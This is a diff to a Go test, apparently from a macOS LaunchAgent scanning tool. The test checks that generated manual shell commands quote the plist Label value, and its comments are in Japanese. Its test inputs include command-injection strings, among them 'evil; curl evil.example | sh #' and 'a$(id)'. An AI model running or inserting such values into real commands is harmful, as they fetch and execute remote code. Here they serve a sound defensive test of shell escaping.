@@ -488,9 +488,19 @@ func TestManualCommandsQuotesShellMetacharacters(t *testing.T) {
 			t.Errorf("引用されていない: %q → %q", p, rm)
 		}
 	}
+	// 🚨 Label も引用する。Label は plist の `Label` キーをそのまま読んだ値で、
+	// ~/Library/LaunchAgents に書けるローカルプロセスが決められる。**実走査で成立する**
+	for _, label := range []string{"evil; curl evil.example | sh #", "a&b", "a|b", "a b", "a\nb", "a$(id)"} {
+		got := manualCommands(Finding{Label: label, Domain: "gui/501", PlistPath: "/Library/LaunchAgents/a.plist"})
+		if !strings.Contains(got[0], "'") {
+			t.Errorf("Label が引用されていない: %q → %q", label, got[0])
+		}
+	}
 	// 素直なパスは引用しない (読みやすさを損なわない)
-	got := manualCommands(Finding{Label: "a", Domain: "system", PlistPath: "/Library/LaunchDaemons/com.example.a.plist"})
-	if strings.Contains(got[len(got)-1], "'") {
-		t.Errorf("素直なパスを引用した: %q", got[len(got)-1])
+	got := manualCommands(Finding{Label: "com.example.a", Domain: "system", PlistPath: "/Library/LaunchDaemons/com.example.a.plist"})
+	for _, c := range got {
+		if strings.Contains(c, "'") {
+			t.Errorf("素直な値を引用した: %q", c)
+		}
 	}
 }
